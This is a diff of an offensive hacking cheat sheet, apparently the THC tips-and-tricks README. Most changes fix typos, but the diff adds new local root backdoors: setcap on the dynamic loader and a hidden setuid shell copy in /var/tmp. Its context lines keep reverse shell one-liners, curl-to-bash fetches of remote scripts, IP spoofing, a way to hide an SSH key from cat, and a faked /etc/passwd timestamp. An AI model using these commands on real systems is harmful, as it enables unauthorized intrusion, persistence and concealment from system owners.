@@ -19,7 +19,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Hide a process as root](#hide-a-process-root)
    1. [Hide scripts](#hide-scripts)
    1. [Hide from cat](#cat)
-   1. [Execute in parrallel with separate logfiles](#parallel)
+   1. [Execute in parallel with separate logfiles](#parallel)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
    1. [Multiple shells via 1 SSH/TCP connection](#ssh-master)
@@ -304,7 +304,7 @@ Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b
 Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
 ```shell
 echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
-### This adds our key as the first key and 'cat authorized_keys' wont show
+### This adds our key as the first key and 'cat authorized_keys' won't show
 ### it. The $'\r' is a bash special to create a \r (carriage return).
 ```
 
@@ -347,7 +347,7 @@ thcssh()
     echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
     echo -e "PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
     ttyp=$(stty -g)
-    stty raw -echo opost
+    stty raw -echo icrnl opost
     [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
     ssh -o UpdateHostKeys=no -o StrictHostKeyChecking="${a:-accept-new}" -T \
         "$@" \
@@ -499,7 +499,7 @@ nmap -r -sn -PR 192.168.0.1/24
 ```
 
 ```sh
-## ICMP discover computers on the local netowrk
+## ICMP discover computers on the local netowork
 NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
 seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
 ```
@@ -664,14 +664,14 @@ GS_HOST=213.171.212.212 gs-netcat -i -s ...
 <a id="ghost"></a>
 **3.vi.c Ghsot IP / IP Spoofing**
 
-Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any programm (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.
+Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any program (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.
 
 ```sh
 source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
 ```
 
 This also works in combination with:
- * [Segfault's ROOT Servers](https://thc.org/segfault/wireguard): Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the taget network.
+ * [Segfault's ROOT Servers](https://thc.org/segfault/wireguard): Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the target network.
  * [QEMU Tunnels](https://securelist.com/network-tunneling-with-qemu/111803/): As above, but less secure.
 
 ---
@@ -1202,7 +1202,7 @@ A list of our [favorite public upload sites](#cloudexfil).
 <a id="rsync"></a>
 ### 4.viii. File transfer - using rsync
 
-Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
+Ideal for synchronizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
 
 Receiver:
 ```posh
@@ -1273,7 +1273,7 @@ On another server:
 curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
 # Create a directory remotely
 curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
-# Create a directory hirachy remotely
+# Create a directory hierarchy remotely
 find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
 # Upload all *.c files (in parallel):
 find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
@@ -1334,7 +1334,7 @@ nc -nvlp 1524
 After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
 ```sh
 pwncat -lp 1524
-# Press "Ctrl-C" if pwncat gets stuck at "registerd new host ...".
+# Press "Ctrl-C" if pwncat gets stuck at "registered new host ...".
 # Then type "back" to get the prompt of the remote shell.
 ```
 
@@ -1411,7 +1411,7 @@ Variant if *'-e'* is not supported:
 ```
 
 * On modern shells this can be shortened to `{ nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
-* The `| :` trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.
+* The `| :` trick won't work on C-Shell/tcsh (FreeBSD), original Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.
 
 Variant for older */bin/sh*:
 ```sh
@@ -1501,14 +1501,14 @@ exec python -c 'import pty; pty.spawn("/bin/bash")'
 ...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:
 
 ```sh
-# On the target host spwan a PTY using any of the above examples:
+# On the target host spawn a PTY using any of the above examples:
 python -c 'import pty; pty.spawn("/bin/bash")'
 # Now Press Ctrl-Z to suspend the connection and return to your own terminal.
 ```
 
 ```
 # On your terminal execute:
-stty raw -echo opost; fg
+stty raw -echo icrnl opost; fg
 ```
 
 ```sh
@@ -1516,9 +1516,10 @@ stty raw -echo opost; fg
 export SHELL=/bin/bash
 export TERM=xterm-256color
 reset -I
-stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "$R"|awk -F";" '{ printf "rows "$3" cols "$2; }')
+stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
 # Pimp up your prompt
-PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+# PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
 ```
 
 <a id="reverse-shell-socat"></a>
@@ -1625,20 +1626,30 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 <a id="ld-backdoor"></a>
 **6.v. Local Root Backdoor**
 
-Stay root once you got root
+#### 1. Backdooring the dynamic loader with setcap
+
 ```bash
-setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 2>/dev/null \
-|| setcap cap_setuid+ep /lib64/ld-2.17.so 2>/dev/null \
-|| echo >&2 "FAILED. File not found"
+### Execute as ROOT user
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+setcap cap_setuid+ep "${fn}"
 ```
-Become root
+
 ```bash
-### Execute as non-root user
+### Execute as non-root user to get root
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 p="python"
 command -v python3 >/dev/null && p="python3"
-[[ -f /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ]] && l="/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
-[[ -f /lib64/ld-2.17.so ]] && l="/lib64/ld-2.17.so"
-exec "${l:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+exec "${fn:?}" "$p" -c 'import os;os.setgid(0);os.setuid(0);os.execlp("bash", "kdaemon")'
+```
+
+#### 2. Good old b00m shell
+
+```shell
+{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
+```
+
+```shell
+exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setgid(0);os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
 ```
 
 <a id="implant"></a>
@@ -1771,7 +1782,7 @@ Note: Or delete the file and then fill the entire harddrive with /dev/urandom an
 <a id="restore-timestamp"></a>
 **8.ii. Restore the date of a file**
 
-Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
+Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modified. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
 
 ```sh
 touch -r /etc/shadow /etc/passwd
@@ -1921,7 +1932,7 @@ fusermount -u .sec
 <a id="encrypting-file"></a>
 **9.iii Encrypting a file**
 
-Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):
+Encrypt your 0-Days and log files before transferring them - please. (and pick your own password):
 
 ```sh
 # Encrypt
@@ -2148,7 +2159,7 @@ crt() {
 | https://archive.org/web/ | Historical view of websites |
 | https://www.farsightsecurity.com/solutions/dnsdb/ | DNS search (not free) |
 | https://wigle.net/ | Wireless Network Mapper |
-| https://radiocells.org/ | Cell Tower Informations |
+| https://radiocells.org/ | Cell Tower Information |
 | https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |
 | https://spur.us/context/me | IP rating `https://spur.us/context/<IP>` |
 | http://drs.whoisxmlapi.com | Reverse Whois Lookup (not free) |
@@ -2176,6 +2187,7 @@ Comms
 1. [Temp-Mail](https://temp-mail.org/en/) - Disposable email service with great Web GUI. Receive only.
 2. [tuta.io](https://tuta.io) or [ProtonMail](https://pm.me)/[.onion](https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion/) - Free & Private email
 1. [Quackr.Io](https://quackr.io/) - Disposable SMS/text messages (List of [Disposable-SMS-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services)).
+1. [SMS-Man](https://sms-man.com) - Anonymous SMS/text that work with Signal, WA, and manh others 
 1. [Crypton](https://crypton.sh/) - Rent a private SIM/SMS with crypto ([.onion](http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/))
 2. [List of "No KYC" Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))
 
@@ -2198,7 +2210,7 @@ Exploits
 
 System Information Gathering
 1. `curl -fsSL https://thc.org/ws | bash` - Show all domains hosted on a server + system-information
-1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
+1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system information for hackers.
 1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)
 1. https://github.com/The-Z-Labs/linux-exploit-suggester - Suggest exploits based on versions on target system 
 1. https://github.com/efchatz/pandora - Windows: dump password from various password managers
